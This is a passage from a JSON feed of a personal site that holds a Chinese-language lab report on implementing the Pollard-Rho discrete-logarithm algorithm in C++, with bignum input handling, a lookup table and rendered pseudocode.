{
    "version": "https://jsonfeed.org/version/1",
    "title": "taf.fyi",
    "subtitle": "taf.fyi",
    "icon": "https://taf.fyi/images/favicon.ico",
    "description": "fuuzen 的个人主页 taf.fyi",
    "home_page_url": "https://taf.fyi",
    "items": [
        {
            "id": "https://taf.fyi/math/cryptography/pollard-rho/",
            "url": "https://taf.fyi/math/cryptography/pollard-rho/",
            "title": "Pollard-Rho",
            "date_published": "2024-12-18T16:00:00.000Z",
            "content_html": "<h1 id=\"大数运算\"><a class=\"anchor\" href=\"#大数运算\">#</a> 大数运算</h1>\n<p>大数运算实现先前的实验报告已经有过，不再赘述。</p>\n<p>但是在 Pollard-Rho 中有大数的模 3 运算，在先前的大数库中没有实现。这里再在  <code>Field::Int</code>  类中增加模 3 运算的方法：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">mod3</span><span class=\"params\">()</span> <span class=\"type\">const</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"type\">__uint128_t</span> res = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = F.N - <span class=\"number\">1</span>;i &gt;= <span class=\"number\">0</span>; i--)&#123;</span><br><span class=\"line\">    res = (res * (<span class=\"built_in\">static_cast</span>&lt;<span class=\"type\">__uint128_t</span>&gt;(<span class=\"number\">1</span>) &lt;&lt; <span class=\"number\">64</span>) + a[i]) % <span class=\"number\">3</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">static_cast</span>&lt;<span class=\"type\">int</span>&gt; (res);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"大数字符串输入输出处理\"><a class=\"anchor\" href=\"#大数字符串输入输出处理\">#</a> 大数字符串输入输出处理</h1>\n<p>本次实验不像先前的实验都是二进制输入输出，而是十进制字符串输入输出。</p>\n<p>对于输出，由于输出的离散对数是有限域 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 以内的，而 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 在本次实验限定为 64 位以内，所以可以直接使用 C++ 本身自带的 64 位数输出。</p>\n<p>对于输入，包含了大数，我在自己的大数库已经有实现，为了更高效的性能，我使用查表的方式实现。我的大数库最高支持 2048 bits 的大数，使用  <code>uint64_t[32]</code>  存储，对应到十进制是 618 位，所以建立的 LookUpTable 可以以 618 个十进制位、1 到 9 这 9 个十进制数作为索引，查询结果就是对应的大数的二进制表示。建表如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">auto</span> <span class=\"title\">gen_TABLE</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">  array&lt;array&lt;array&lt;<span class=\"type\">uint64_t</span>, 32&gt;, 9&gt;, 617&gt; table = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">  <span class=\"type\">uint64_t</span> a[<span class=\"number\">32</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">  <span class=\"type\">uint64_t</span> a1[<span class=\"number\">32</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">  a[<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">617</span>; ++i)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">32</span>; ++j)&#123;</span><br><span class=\"line\">      a1[j] = a[j];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">int</span> t = i == <span class=\"number\">616</span> ? <span class=\"number\">3</span> : <span class=\"number\">9</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; t; ++j)&#123;</span><br><span class=\"line\">      <span class=\"type\">uint64_t</span> carry = <span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> (<span class=\"type\">int</span> k = <span class=\"number\">0</span>; k &lt; <span class=\"number\">32</span>; ++k) &#123;</span><br><span class=\"line\">        table[i][j][k] = a[k];</span><br><span class=\"line\">        <span class=\"type\">uint64_t</span> sum = a[k] + a1[k] + carry;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (sum &lt; a[k] || sum &lt; a1[k]) &#123;</span><br><span class=\"line\">          carry = <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          carry = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        a[k] = sum;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> table;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里我之所以使用  <code>array&lt;array&lt;array&lt;uint64_t, 32&gt;, 9&gt;, 617&gt; </code>  存表，是因为我原本希望在编译时  <code>constexpr</code>  建表，提升运行效率，但是在 OJ 系统上会导致超出编译内存。</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">not in constexpr, bcz adding it will exceed memory limit on OJ system.</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"keyword\">auto</span> TABLE = <span class=\"built_in\">gen_TABLE</span>();</span><br></pre></td></tr></table></figure></p>\n<p>输入就通过查表实现，根据输入的每一个十进制位查刚刚建立的表，查询结果加到最终结果之中：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// return the sum of used limbs</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">int</span> <span class=\"title\">string2limbs</span><span class=\"params\">(<span class=\"type\">const</span> string&amp; s, <span class=\"type\">uint64_t</span> * a)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> l = s.<span class=\"built_in\">length</span>(), k = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"type\">bool</span> flag = l &gt; <span class=\"number\">19</span>;</span><br><span class=\"line\">  a[<span class=\"number\">0</span>] = <span class=\"built_in\">stoull</span>(</span><br><span class=\"line\">    s.<span class=\"built_in\">substr</span>(</span><br><span class=\"line\">      flag ? l - <span class=\"number\">19</span> : <span class=\"number\">0</span>,</span><br><span class=\"line\">      flag ? <span class=\"number\">19</span> : l</span><br><span class=\"line\">    )</span><br><span class=\"line\">  );</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">19</span>; i &lt; l; ++i) &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> j = s[l - i - <span class=\"number\">1</span>] - <span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(j == <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> sum, carry = <span class=\"number\">0</span>;</span><br><span class=\"line\">    k = <span class=\"number\">0</span>;</span><br><span class=\"line\">    j--;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(TABLE[i][j][k] == <span class=\"number\">0</span>)k++;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(k &lt; <span class=\"number\">32</span> &amp;&amp; (TABLE[i][j][k] != <span class=\"number\">0</span> || carry != <span class=\"number\">0</span>))&#123;</span><br><span class=\"line\">      sum = a[k] + TABLE[i][j][k] + carry;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (sum &lt; a[k] + carry || sum &lt; TABLE[i][j][k] + carry) &#123;</span><br><span class=\"line\">        carry = <span class=\"number\">1</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        carry = <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      a[k] = sum;</span><br><span class=\"line\">      k++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> k;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>我的大数库采用面向对象的设计，所以输入也封装到了友元  <code>&gt;&gt;</code>  之中：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 输入有限域（p）</span></span><br><span class=\"line\"><span class=\"keyword\">inline</span> <span class=\"keyword\">friend</span> std::istream&amp; <span class=\"keyword\">operator</span>&gt;&gt;(std::istream&amp; is, Field&amp; f) &#123;</span><br><span class=\"line\">  string s;</span><br><span class=\"line\">  is &gt;&gt; s;</span><br><span class=\"line\">  f.N = <span class=\"built_in\">string2limbs</span>(s, p);</span><br><span class=\"line\">  <span class=\"built_in\">initField</span>(f.p, f.p_2, f.R2modp, f.g, f.N);  <span class=\"comment\">// 有限域预计算处理</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> is;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 输入整数</span></span><br><span class=\"line\"><span class=\"keyword\">inline</span> <span class=\"keyword\">friend</span> std::istream&amp; <span class=\"keyword\">operator</span>&gt;&gt;(std::istream&amp; is, Int&amp; a) &#123;</span><br><span class=\"line\">  string s;</span><br><span class=\"line\">  is &gt;&gt; s;</span><br><span class=\"line\">  <span class=\"built_in\">string2limbs</span>(s, a.a);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> is;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"pollard-rho\"><a class=\"anchor\" href=\"#pollard-rho\">#</a> Pollard-Rho</h1>\n<p>Pollard-Rho 的算法我也采用了面向对象的设计，将一个 DLP 问题的条件作为成员变量封装在里面：</p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span> 定义在  <code>Field f</code> ，同时也是整个 Pollard-Rho 算法大数运算时所基于的有限域。</li>\n<li><code>uint64_t n</code>  即为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span>，因为输入限制在 64 位以内，所以不必使用大数。</li>\n<li><code>Int alpha = Int(f)</code>  即为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.0037em;\">α</span></span></span></span>，属于有限域 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span>。</li>\n<li><code>Int beta = Int(f)</code>  即为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05278em;\">β</span></span></span></span>，属于有限域 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span>。</li>\n</ul>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">PollardRho</span> &#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">  <span class=\"built_in\">PollardRho</span>()&#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">  <span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">(Int <span class=\"type\">const</span> &amp; x, <span class=\"type\">__uint128_t</span> <span class=\"type\">const</span> &amp; a, <span class=\"type\">__uint128_t</span> <span class=\"type\">const</span> &amp; b, Int &amp; x_, <span class=\"type\">__uint128_t</span> &amp; a_, <span class=\"type\">__uint128_t</span> &amp; b_)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">(Int &amp; x, <span class=\"type\">__uint128_t</span> &amp; a, <span class=\"type\">__uint128_t</span> &amp; b)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"type\">__uint128_t</span> <span class=\"title\">gcd</span><span class=\"params\">(<span class=\"type\">__uint128_t</span> a, <span class=\"type\">__uint128_t</span> b)</span></span>;  <span class=\"comment\">// 返回 a,b 的 gcd</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"type\">__uint128_t</span> <span class=\"title\">mod_inverse</span><span class=\"params\">(<span class=\"type\">__uint128_t</span> a, <span class=\"type\">__uint128_t</span> p)</span></span>;  <span class=\"comment\">// 返回 a^(-1) mod p</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 值为 1 的大数</span></span><br><span class=\"line\">  string _One = <span class=\"built_in\">string</span>(<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">  <span class=\"type\">const</span> Int One = <span class=\"built_in\">Int</span>(f, _One);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">  Field f;</span><br><span class=\"line\">  Int alpha = <span class=\"built_in\">Int</span>(f);</span><br><span class=\"line\">  Int beta = <span class=\"built_in\">Int</span>(f);</span><br><span class=\"line\">  <span class=\"type\">uint64_t</span> n;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"type\">uint64_t</span> <span class=\"title\">solve</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>具体的算法流程如下：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo stretchy=\"false\">(</mo><mi>x</mi><mn>1</mn><mo separator=\"true\">,</mo><mi>a</mi><mn>1</mn><mo separator=\"true\">,</mo><mi>b</mi><mn>1</mn><mo stretchy=\"false\">)</mo><mo>←</mo><mi>f</mi><mo stretchy=\"false\">(</mo><mn>1</mn><mo separator=\"true\">,</mo><mn>0</mn><mo separator=\"true\">,</mo><mn>0</mn><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo stretchy=\"false\">(</mo><mi>x</mi><mn>2</mn><mo separator=\"true\">,</mo><mi>a</mi><mn>2</mn><mo separator=\"true\">,</mo><mi>b</mi><mn>2</mn><mo stretchy=\"false\">)</mo><mo>←</mo><mi>f</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mn>1</mn><mo separator=\"true\">,</mo><mi>a</mi><mn>1</mn><mo separator=\"true\">,</mo><mi>b</mi><mn>1</mn><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>while </mtext><mi>x</mi><mn>1</mn><mo mathvariant=\"normal\">≠</mo><mi>x</mi><mn>2</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>    </mtext><mo stretchy=\"false\">(</mo><mi>x</mi><mn>1</mn><mo separator=\"true\">,</mo><mi>a</mi><mn>1</mn><mo separator=\"true\">,</mo><mi>b</mi><mn>1</mn><mo stretchy=\"false\">)</mo><mo>←</mo><mi>f</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mn>1</mn><mo separator=\"true\">,</mo><mi>a</mi><mn>1</mn><mo separator=\"true\">,</mo><mi>b</mi><mn>1</mn><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>    </mtext><mo stretchy=\"false\">(</mo><mi>x</mi><mn>2</mn><mo separator=\"true\">,</mo><mi>a</mi><mn>2</mn><mo separator=\"true\">,</mo><mi>b</mi><mn>2</mn><mo stretchy=\"false\">)</mo><mo>←</mo><mi>f</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mn>2</mn><mo separator=\"true\">,</mo><mi>a</mi><mn>2</mn><mo separator=\"true\">,</mo><mi>b</mi><mn>2</mn><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>    </mtext><mo stretchy=\"false\">(</mo><mi>x</mi><mn>2</mn><mo separator=\"true\">,</mo><mi>a</mi><mn>2</mn><mo separator=\"true\">,</mo><mi>b</mi><mn>2</mn><mo stretchy=\"false\">)</mo><mo>←</mo><mi>f</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mn>2</mn><mo separator=\"true\">,</mo><mi>a</mi><mn>2</mn><mo separator=\"true\">,</mo><mi>b</mi><mn>2</mn><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>解线性同余方程:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>    </mtext><mo stretchy=\"false\">(</mo><mi>b</mi><mn>2</mn><mo>−</mo><mi>b</mi><mn>1</mn><mo stretchy=\"false\">)</mo><mi>x</mi><mo>=</mo><mi>a</mi><mn>1</mn><mo>−</mo><mi>a</mi><mn>2</mn><mtext>    </mtext><mo stretchy=\"false\">(</mo><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>n</mi><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;(x1,a1,b1)\\gets f(1,0,0)\\\\\n&amp;(x2,a2,b2)\\gets f(x1,a1,b1)\\\\\n&amp;\\bold{\\text{while}}\\ x1\\neq x2\\\\\n&amp;\\ \\ \\ \\ (x1,a1,b1)\\gets f(x1,a1,b1)\\\\\n&amp;\\ \\ \\ \\ (x2,a2,b2)\\gets f(x2,a2,b2)\\\\\n&amp;\\ \\ \\ \\ (x2,a2,b2)\\gets f(x2,a2,b2)\\\\\n&amp;\\text{解线性同余方程:}\\\\\n&amp;\\ \\ \\ \\ (b2-b1)x=a1-a2\\ \\ \\ \\ (\\bmod n)\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:12.000000000000002em;vertical-align:-5.750000000000001em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:6.250000000000001em;\"><span style=\"top:-8.25em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-6.75em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-5.249999999999999em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.749999999999999em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-2.249999999999999em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-0.7499999999999987em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:0.7500000000000009em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:2.250000000000001em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.750000000000001em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:6.250000000000001em;\"><span style=\"top:-8.41em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">←</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">0</span><span class=\"mclose\">)</span></span></span><span style=\"top:-6.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">2</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">←</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">1</span><span class=\"mclose\">)</span></span></span><span style=\"top:-5.409999999999999em;\"><span 